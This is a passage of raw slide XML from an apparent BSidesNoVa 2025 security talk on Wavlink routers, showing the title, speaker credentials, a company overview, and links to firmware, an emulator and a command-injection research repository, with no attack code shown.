          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6215463" y="1638300"/>
            <a:ext cx="1128900" cy="1188300"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="0" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:norm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116" name="Google Shape;116;p17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="8" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="288575" y="3386400"/>
            <a:ext cx="2665200" cy="1188300"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="b" bIns="91425" lIns="0" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:norm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117" name="Google Shape;117;p17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="9" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6121413" y="3386400"/>
            <a:ext cx="2665200" cy="1188300"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="b" bIns="91425" lIns="0" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:norm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118" name="Google Shape;118;p17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="13" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3192450" y="3386400"/>
            <a:ext cx="2665200" cy="1188300"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="b" bIns="91425" lIns="0" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:norm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www.wavlink.com/en_us/index.html" TargetMode="External"/><Relationship Id="rId4"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docs.wavlink.xyz/Firmware/fm-530g3a/" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://docs.wavlink.xyz/Firmware/fm-530g3a/" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://files2.wavlink.com/drivers/fw/WN530G3A_20230616_WAVLINK_M30G3_V230616.bin" TargetMode="External"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://files2.wavlink.com/drivers/fw/WN530G3A_20230616_WAVLINK_M30G3_V230616.bin" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image3.png"/><Relationship Id="rId8"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hyperlink" Target="https://github.com/therealsaumil/emux"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27.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hyperlink" Target="http://drive.google.com/file/d/1qvNXFogHqBxpUMoM0EtMaUJ1TQGkKmhl/view" TargetMode="External"/><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hyperlink" Target="http://files2.wavlink.com" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/ice-wzl/Wavlink-WN530G3A-Cmd-Injecti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hyperlink" Target="http://login.sh"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hyperlink" Target="http://drive.google.com/file/d/1VZb_pkzGLaYDmpMlSOo2oRRPlKaPhQM_/view" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image1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hyperlink" Target="http://drive.google.com/file/d/1JndkX3jwngbWpJWdvb4lj5nDv0gesqA4/view" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image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hyperlink" Target="http://drive.google.com/file/d/1KLgmjBy9odIJcJEvnT64QTEcUEwbysCm/view" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image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hyperlink" Target="http://drive.google.com/file/d/1YxxgQMe-4gUf-McUFA11asIED5jhU9nA/view" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image1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22.pn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hyperlink" Target="http://drive.google.com/file/d/1C29BpkFqJ5iJvVI5E8XWbSWs3_Vstwk0/view" TargetMode="Externa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hyperlink" Target="http://drive.google.com/file/d/1K7mBfA7T5kQuB3aAtYCOfZNRL4Sw2251/view" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image2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30.png"/><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26.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hyperlink" Target="https://www.wavlink.com/en_us/product/WL-WN530G3.html" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.wavlink.com/en_us/firmware.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8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4113375"/>
            <a:ext cx="1165800" cy="33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Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="124" name="Google Shape;124;p18"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="286780" y="3224427"/>
            <a:ext cx="116718" cy="58359"/>
            <a:chOff x="498725" y="2069800"/>
            <a:chExt cx="205200" cy="102600"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:cxnSp>
          <p:nvCxnSpPr>
            <p:cNvPr id="125" name="Google Shape;125;p18"/>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126" name="Google Shape;126;p18"/>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sp>
        <p:nvSpPr>
          <p:cNvPr id="127" name="Google Shape;127;p18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4294967295" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="228600"/>
            <a:ext cx="6658800" cy="14190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None/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:latin typeface="Urbanist ExtraBold"/>
                <a:ea typeface="Urbanist ExtraBold"/>
                <a:cs typeface="Urbanist ExtraBold"/>
                <a:sym typeface="Urbanist ExtraBold"/>
              </a:rPr>
              <a:t>Wavlink: When security and software design is an afterthought</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Urbanist ExtraBold"/>
              <a:ea typeface="Urbanist ExtraBold"/>
              <a:cs typeface="Urbanist ExtraBold"/>
              <a:sym typeface="Urbanist ExtraBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1400">
              <a:latin typeface="Urbanist ExtraBold"/>
              <a:ea typeface="Urbanist ExtraBold"/>
              <a:cs typeface="Urbanist ExtraBold"/>
              <a:sym typeface="Urbanist ExtraBold"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="128" name="Google Shape;128;p18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4294967295" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="1738950"/>
            <a:ext cx="4402800" cy="4989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105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1800"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="605"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2435">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist SemiBold"/>
                <a:ea typeface="Urbanist SemiBold"/>
                <a:cs typeface="Urbanist SemiBold"/>
                <a:sym typeface="Urbanist SemiBold"/>
              </a:rPr>
              <a:t>BsidesNoVa 2025</a:t>
            </a:r>
            <a:endParaRPr sz="2435">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist SemiBold"/>
              <a:ea typeface="Urbanist SemiBold"/>
              <a:cs typeface="Urbanist SemiBold"/>
              <a:sym typeface="Urbanist SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="75000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buSzPts val="605"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2490">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist Medium"/>
              <a:ea typeface="Urbanist Medium"/>
              <a:cs typeface="Urbanist Medium"/>
              <a:sym typeface="Urbanist Medium"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="129" name="Google Shape;129;p18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4294967295" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="295800" y="4085925"/>
            <a:ext cx="1098600" cy="393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275"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1350">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>ice-wzl</a:t>
            </a:r>
            <a:endParaRPr sz="1350">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="130" name="Google Shape;130;p18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4294967295" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="100191" y="3637475"/>
            <a:ext cx="4659600" cy="252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275"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1850"/>
              <a:t>Presented by</a:t>
            </a:r>
            <a:endParaRPr sz="185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9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="234750"/>
            <a:ext cx="3904500" cy="5241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300">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>whoami</a:t>
            </a:r>
            <a:endParaRPr sz="3300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="136" name="Google Shape;136;p19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="3" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4716625"/>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None/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>BsidesNoVa</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="137" name="Google Shape;137;p19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="171400" y="909175"/>
            <a:ext cx="8674500" cy="35472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ice-wzl</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GIAC Advisory Board</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SANS vTA, GXPN, GAWN, GREM, GASF, GCIH, GCIA</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CISSP</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HijackLibs Contributor</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MSc Computer Science, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>Merrimack College </a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>Socials:</a:t>
            </a:r>
            <a:endParaRPr b="1"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b="1" lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>X</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>: @ice_wzl_cyber</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b="1" lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>Github</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>: ice-wzl</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanis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0"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="290450"/>
            <a:ext cx="4088400" cy="942900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="0" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:sp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Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>Wavlink: An Overview</a:t>
            </a:r>
            <a:endParaRPr sz="3000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="3500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="143" name="Google Shape;143;p20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="3" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="4679825"/>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
        <p:nvSpPr>
          <p:cNvPr id="144" name="Google Shape;144;p20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="133800" y="871925"/>
            <a:ext cx="4047000" cy="3659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Urbanist"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:uFill>
                  <a:noFill/>
                </a:uFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
                <a:hlinkClick r:id="rId3">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>https://www.wavlink.com/en_us/index.html</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-317500" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Urbanist"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>https://www.wavlink.com/en_us/firmware.html</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-317500" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Urbanist"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>Wavlink is a registered trademark of Winstars Technology Ltd.</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-317500" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Urbanist"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>Shenzhen, China-based company that manufactures and sells networking products such as routers and extenders </a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-317500" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Urbanist"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>Operations are in China, Hong Kong, and California</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-317500" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Urbanist"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>Wavlink products are sold internationally via online retailers like Amazon and eBay</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="145" name="Google Shape;145;p20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5061625" y="3655400"/>
            <a:ext cx="2853300" cy="87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Wavlink AX6000</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>$148 MSRP</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
